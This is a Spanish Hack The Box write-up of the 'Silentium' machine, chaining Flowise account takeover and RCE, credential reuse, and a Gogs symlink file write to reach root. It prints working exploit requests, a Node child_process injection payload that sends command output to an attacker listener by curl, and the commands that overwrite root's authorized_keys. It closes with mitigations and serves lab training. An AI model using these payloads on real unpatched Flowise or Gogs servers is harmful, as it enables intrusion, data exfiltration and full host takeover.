---
title: "Silentium — cadena de cuatro CVEs: Flowise a RCE y Gogs como root"
date: 2026-08-01
box: Silentium
plataforma: Hack The Box
so: Linux (Ubuntu 24.04)
dificultad: Medium
lead: "Cuatro CVEs recientes sobre dos servicios. Un Flowise 3.0.5 en un vhost de staging permite tomar la cuenta de administrador sin autenticación y ejecutar código como root dentro de un contenedor; el entorno filtra una contraseña reutilizada en SSH. Para root, un Gogs 0.13.3 corriendo como root cae por escritura arbitraria vía symlink."
stack: "Flowise · CVE-2025-58434 · CVE-2025-59528 · Gogs · CVE-2025-8110 · symlink · SSH"
description: "Writeup de la máquina Silentium de Hack The Box (Linux, Medium): account takeover en Flowise (CVE-2025-58434), RCE en el nodo CustomMCP (CVE-2025-59528), reutilización de credenciales para el acceso de usuario y escritura arbitraria por symlink en Gogs corriendo como root (CVE-2025-8110)."
---

Silentium es una máquina Linux de dificultad media que encadena cuatro CVEs
recientes sobre dos servicios distintos. Empieza con una web corporativa que
esconde, en un subdominio de *staging*, una instancia de **Flowise 3.0.5**. Desde
ahí tomo la cuenta de administrador sin autenticación (**CVE-2025-58434**) y
ejecuto código como root dentro de un contenedor (**CVE-2025-59528**). El entorno
del proceso filtra una contraseña SMTP reutilizada en SSH, y eso me da el acceso de
usuario. Para root, un **Gogs 0.13.3** interno que corre como `root` es vulnerable a
escritura arbitraria de ficheros vía *symlink* (**CVE-2025-8110**), con la que
sobrescribo `/root/.ssh/authorized_keys`. No incluyo flags.

La cadena, resumida:

1. `nmap` → solo 22 y 80.
2. Fuzzing de vhost → `staging.silentium.htb`, un Flowise 3.0.5.
3. **CVE-2025-58434** — fuga del `tempToken` → *takeover* de `ben`.
4. **CVE-2025-59528** — RCE en el nodo CustomMCP → root en el contenedor.
5. Entorno del proceso → `SMTP_PASSWORD` reutilizada → **SSH como `ben`**.
6. Configs de nginx → tercer vhost `staging-v2-code.dev.silentium.htb` → **Gogs 0.13.3 como root**.
7. **CVE-2025-8110** — symlink + `PutContents` → sobrescribir `authorized_keys` → **SSH como root**.

## Recon

### nmap

Empiezo con un escaneo completo de puertos TCP:

```bash
nmap -sC -sV -p- --min-rate 3000 -oN nmap_full.txt 10.129.2.162
```

```
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15
80/tcp    open     http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://silentium.htb/
6960/tcp  filtered unknown
14463/tcp filtered unknown
```

La superficie es mínima: SSH y HTTP. Los puertos filtrados no responden. El servidor
web redirige por nombre (`silentium.htb`), así que lo añado a `/etc/hosts` para poder
navegarlo:

```bash
echo "10.129.2.162 silentium.htb" | sudo tee -a /etc/hosts
```

Durante toda la fase web se puede evitar tocar `/etc/hosts` mandando la cabecera
`Host` a mano, cómodo mientras no sé cuántos vhosts hay:

```bash
curl -s -H "Host: silentium.htb" http://10.129.2.162/
```

### Web - TCP 80

La web principal es la de una financiera. Es completamente estática —la calculadora
de préstamos vive entera en un `app.js`, sin API detrás—, así que no hay mucho que
atacar directamente. Lo único aprovechable es la sección de equipo, que me da nombres
que probablemente sean usuarios: **Marcus Thorne**, **Ben** y **Elena Rossi**.

### Fuzzing de subdominios

Como el servidor enruta por nombre, pruebo a fuzzear subdominios contra la cabecera
`Host`:

```bash
ffuf -u http://10.129.2.162/ -H "Host: FUZZ.silentium.htb" \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -fs 178 -t 50
```

```
staging   [Status: 200, Size: 3142, Words: 789, Lines: 70]
```

`staging.silentium.htb` sirve una instancia de **Flowise**, una plataforma open
source para montar agentes LLM de forma visual. Aquí es donde empieza lo interesante.

## Shell as ben

### Enumeración de Flowise

Varios endpoints informativos de la API responden sin autenticación, y uno de ellos
me da la versión exacta:

```bash
curl -s -H "Host: staging.silentium.htb" http://10.129.2.162/api/v1/version
# {"version":"3.0.5"}
curl -s -H "Host: staging.silentium.htb" http://10.129.2.162/api/v1/chatflows
# {"error":"Unauthorized Access"}  → HTTP 401
```

Flowise **3.0.5** arrastra dos CVEs críticos parcheados en 3.0.6:

- **CVE-2025-58434** (CVSS 9.8) — divulgación del token de reseteo de contraseña sin autenticación.
- **CVE-2025-59528** (CVSS 10.0) — RCE por inyección de código en el nodo CustomMCP.

Los voy a encadenar: el primero para entrar, el segundo para ejecutar.

### CVE-2025-58434 — account takeover

Antes del *takeover* necesito saber qué cuentas existen. El endpoint de login
distingue entre "usuario inexistente" y "contraseña incorrecta", lo que me deja
enumerar usuarios:

```bash
for email in admin@silentium.htb ben@silentium.htb marcus@silentium.htb elena@silentium.htb; do
  echo -n "$email → "
  curl -s -H "Host: staging.silentium.htb" -H "Content-Type: application/json" \
    -d "{\"email\":\"$email\",\"password\":\"x\"}" \
    http://10.129.2.162/api/v1/auth/login; echo
done
```

```
admin@silentium.htb  → {"statusCode":404,"message":"User Not Found"}
ben@silentium.htb    → {"statusCode":401,"message":"Incorrect Email or Password"}   ← existe
marcus@silentium.htb → {"statusCode":404,"message":"User Not Found"}
```

Solo `ben` existe. Ahora el fallo: el endpoint `forgot-password` devuelve el objeto
de usuario completo —incluido el `tempToken` que debería llegar únicamente por
correo— en el cuerpo de la respuesta. Un detalle: el payload va anidado bajo la clave
`user`; mandar `{"email": "..."}` plano devuelve un `500`.

```bash
curl -s -H "Host: staging.silentium.htb" -H "Content-Type: application/json" \
  -d '{"user":{"email":"ben@silentium.htb"}}' \
  http://10.129.2.162/api/v1/account/forgot-password
```

```json
{
  "user": {
    "email": "ben@silentium.htb",
    "credential": "$2a$05$6o1ngPjXiRj.EbTK33Phyu...",
    "tempToken": "GhfvKY0DkftGnNHbhxX6zXNPnWc5w44XDTTM63njAiUXfbgLogzPRkOlnSWUFkS2",
    "tokenExpiry": "2026-08-01T17:42:18.533Z",
    "status": "active"
  }
}
```

Con ese token reseteo la contraseña de `ben` y entro con la nueva:

```bash
TOKEN="GhfvKY0DkftGnNHbhxX6zXNPnWc5w44XDTTM63njAiUXfbgLogzPRkOlnSWUFkS2"
curl -s -H "Host: staging.silentium.htb" -H "Content-Type: application/json" \
  -d "{\"user\":{\"email\":\"ben@silentium.htb\",\"tempToken\":\"$TOKEN\",\"password\":\"P@ssw0rd123!\"}}" \
  http://10.129.2.162/api/v1/account/reset-password

curl -s -c cookies.txt -H "Host: staging.silentium.htb" -H "Content-Type: application/json" \
  -d '{"email":"ben@silentium.htb","password":"P@ssw0rd123!"}' \
  http://10.129.2.162/api/v1/auth/login
# {"email":"ben@silentium.htb","isOrganizationAdmin":true, ...}
```

Ya tengo sesión de administrador de la organización. Guardo la cookie para el
siguiente paso.

### CVE-2025-59528 — RCE en el nodo CustomMCP

El RCE está en el nodo CustomMCP. La función `convertToValidJSONString` pasa la
entrada del usuario directamente al constructor `Function()`, que es un `eval()`
encubierto:

```js
Function('return ' + inputString)()
```

El parámetro `mcpServerConfig` llega hasta ahí sin sanear, así que puedo ejecutar
JavaScript arbitrario con los privilegios del runtime de Node. Hay un detalle: sin
la cabecera `x-request-from: internal` el endpoint responde `401` aunque la sesión
sea válida. Es un control de origen trivialmente falsificable, pero imprescindible.

```bash
curl -s -b cookies.txt -H "Host: staging.silentium.htb" \
  -H "Content-Type: application/json" -H "x-request-from: internal" \
  -d '{"loadMethod":"listActions","inputs":{"mcpServerConfig":
      "{x:(function(){const cp=process.mainModule.require(\"child_process\");cp.exec(\"id > /tmp/x\");return 1;})()}"}}' \
  http://10.129.2.162/api/v1/node-load-method/customMCP
```

El problema es que la respuesta es **siempre la misma**, funcione o no: es un RCE
ciego. Para tener salida, exfiltro el resultado por HTTP a un listener mío,
codificado en base64 dentro de una cabecera para no romper con caracteres raros:

```bash
# Payload: ejecuta CMD y devuelve la salida en la cabecera X-Data
{"loadMethod":"listActions","inputs":{"mcpServerConfig":
  "{x:(function(){
      const cp=process.mainModule.require(\"child_process\");
      let out; try{out=cp.execSync(\"CMD\",{timeout:8000}).toString();}catch(e){out=\"ERR:\"+e.message;}
      const b64=Buffer.from(out).toString(\"base64\");
      cp.exec(\"curl -s http://10.10.14.147:4444/ -H \\\"X-Data: \"+b64+\"\\\"\");
      return 1;
  })()}"}}
```

Con `id`:

```
uid=0(root) gid=0(root) groups=0(root),...
```

Soy root, pero dentro de un contenedor Docker (Alpine 3.22.1, Node 20.19.4). Antes
de perseguir el escape, lo compruebo:

```bash
grep Cap /proc/self/status   # CapEff: ...a00425fb → capabilities por defecto, NO privilegiado
cat /proc/self/mountinfo     # /root/.flowise → único bind mount
ls -la /var/run/docker.sock  # No such file or directory
```

Sin `docker.sock`, sin capabilities extra y sin montajes sensibles: el escape
directo no es el camino. Lo interesante estará en la configuración.

### Reutilización de credenciales

Lo más rentable de un RCE en un contenedor suele ser el entorno del proceso, y aquí
no falla:

```bash
run_remote.sh "env"
```

```bash
FLOWISE_PASSWORD=F1l3_d0ck3r          # ← señuelo, no vale para SSH
SMTP_PASSWORD=r04D!!_R4ge             # ← reutilizada en el sistema
SENDER_EMAIL=ben@silentium.htb
```

`FLOWISE_PASSWORD` no lleva a ningún sitio, pero la contraseña de SMTP sí está
reutilizada como contraseña de sistema:

```bash
ssh ben@10.129.2.162        # r04D!!_R4ge
# uid=1000(ben) gid=1000(ben) groups=1000(ben),100(users)
```

Con eso tengo shell de usuario y la flag de `ben` (no la incluyo).

## Shell as root

### Enumeración del host

Como `ben`, lo básico no da nada: `sudo -l` vacío, sin SUID raros, sin capabilities
explotables y sin pertenecer al grupo `docker`. Lo que sí es interesante son los
servicios que solo escuchan en loopback:

```bash
ss -tlnp
```

```
LISTEN  127.0.0.1:8025      ← MailHog (interfaz web)
LISTEN  127.0.0.1:1025      ← MailHog (SMTP)
LISTEN  127.0.0.1:3000      ← Flowise
LISTEN  127.0.0.1:3001      ← ???
LISTEN    0.0.0.0:80        ← nginx
```

El `3001` no me dice nada de entrada, así que releo las configuraciones de nginx —un
paso que se olvida demasiado tras entrar— y aparece un vhost de **tercer nivel** que
el fuzzing de subdominios de primer nivel nunca habría encontrado:

```nginx
server {
    server_name staging-v2-code.dev.silentium.htb;
    location / { proxy_pass http://127.0.0.1:3001; }
}
```

### Gogs corriendo como root

En el `3001` corre un **Gogs**, y su configuración es una invitación:

```ini
RUN_USER   = root                     # ← ejecuta como root
[auth]
DISABLE_REGISTRATION = false          # ← registro abierto
```

```
Gogs version 0.13.3
```

Gogs **0.13.3** ejecutándose como `root` con el registro abierto es vulnerable a
**CVE-2025-8110** (CVSS 8.7, en el catálogo KEV de CISA): escritura arbitraria de
ficheros que se explotó como 0-day durante meses, parcheada en 0.13.4. Es mi vía a
root.

### CVE-2025-8110 — escritura arbitraria por symlink

Primero necesito una cuenta. El registro exige un captcha servido como imagen; lo
descargo, lo escalo con `convert` para leerlo a mano y, con el `_csrf` y el
`captcha_id` del formulario, doy de alta al usuario `pwnr`.

El exploit necesita `git push`, y `git` no me deja fijar la cabecera `Host` que nginx
usa para enrutar el vhost. La solución limpia es saltarme nginx y hablar directamente
con Gogs por un reenvío de puertos sobre la sesión de `ben`:

```bash
ssh -L 3001:127.0.0.1:3001 ben@10.129.2.162 -N
```

Genero un token de API desde `/user/settings/applications` y con él opero contra
`http://127.0.0.1:3001`.

La vulnerabilidad es un **bypass del parche de CVE-2024-55947**. Aquel fallo permitía
escapar del directorio del repositorio con `../`, y se corrigió validando los nombres
de ruta. Pero la API `PutContents` **valida la ruta y no el destino de los enlaces
simbólicos**: si un fichero del repo es un symlink, la escritura lo sigue hasta su
objetivo real —fuera del repo y con los privilegios del proceso, que aquí es `root`.

```bash
# 1) crear el repositorio vía API
curl -s -H "Authorization: token $TOKEN" -H "Content-Type: application/json" \
  -d '{"name":"pwnrepo","auto_init":true,"readme":"Default"}' \
  http://127.0.0.1:3001/api/v1/user/repos

# 2) commitear el symlink por git (la API solo crea ficheros regulares)
git clone "http://pwnr:$TOKEN@127.0.0.1:3001/pwnr/pwnrepo.git"
cd pwnrepo
ln -s /root/.ssh/authorized_keys pwnlink
git add pwnlink && git commit -m "add link" && git push origin master
git ls-files -s pwnlink
# 120000 9c87fc52...  pwnlink   ← modo 120000 = symlink

# 3) escribir a través del symlink con PutContents
ssh-keygen -t ed25519 -f pwn_key -N ""
curl -s -X PUT -H "Authorization: token $TOKEN" -H "Content-Type: application/json" \
  -d "{\"message\":\"update\",\"content\":\"$(base64 -w0 pwn_key.pub)\",
       \"sha\":\"9c87fc525b63ebd989fa409533d3be1b295d6ec3\",\"branch\":\"master\"}" \
  "http://127.0.0.1:3001/api/v1/repos/pwnr/pwnrepo/contents/pwnlink"
```

Gogs sigue el enlace y escribe mi clave pública en `/root/.ssh/authorized_keys` como
root. Funciona porque `/etc/ssh/sshd_config` deja `PermitRootLogin` comentado, y el
valor por defecto en Ubuntu es `prohibit-password`: prohíbe contraseña pero **permite
clave pública**.

```bash
chmod 600 pwn_key
ssh -i pwn_key root@10.129.2.162
# uid=0(root) gid=0(root) groups=0(root)
```

Y con eso, root y su flag (tampoco la incluyo).

## Mitigaciones

| Fallo | Corrección |
|---|---|
| Flowise 3.0.5 (CVE-2025-58434 / CVE-2025-59528) | Actualizar a **≥ 3.0.6**. No exponer staging a internet. |
| Enumeración de usuarios en el login | Respuesta genérica idéntica para usuario inexistente y contraseña incorrecta. |
| Control de acceso por `x-request-from` | Una cabecera enviada por el cliente no es un límite de confianza. Autenticación real por endpoint. |
| Secretos en variables de entorno | Gestor de secretos y, sobre todo, **no reutilizar** la contraseña SMTP como contraseña de sistema. |
| Gogs 0.13.3 (CVE-2025-8110) | Actualizar a **≥ 0.13.4**. Deshabilitar el registro abierto. |
| Gogs como `root` | Ejecutarlo con un usuario dedicado (`RUN_USER = git`): un RCE en el servicio deja de ser compromiso total del host. |

## Referencias

- [CVE-2025-58434 — Flowise: divulgación del token de reseteo (GHSA-wgpv-6j63-x5ph)](https://github.com/advisories/GHSA-wgpv-6j63-x5ph)
- [CVE-2025-59528 — Flowise: RCE en el nodo CustomMCP (SonicWall)](https://www.sonicwall.com/blog/flowiseai-custom-mcp-node-remote-code-execution-)
- [CVE-2025-8110 — Gogs: RCE vía symlink (Wiz Research)](https://www.wiz.io/blog/wiz-research-gogs-cve-2025-8110-rce-exploit)
- [CISA KEV — explotación activa de Gogs](https://thehackernews.com/2026/01/cisa-warns-of-active-exploitation-of.html)
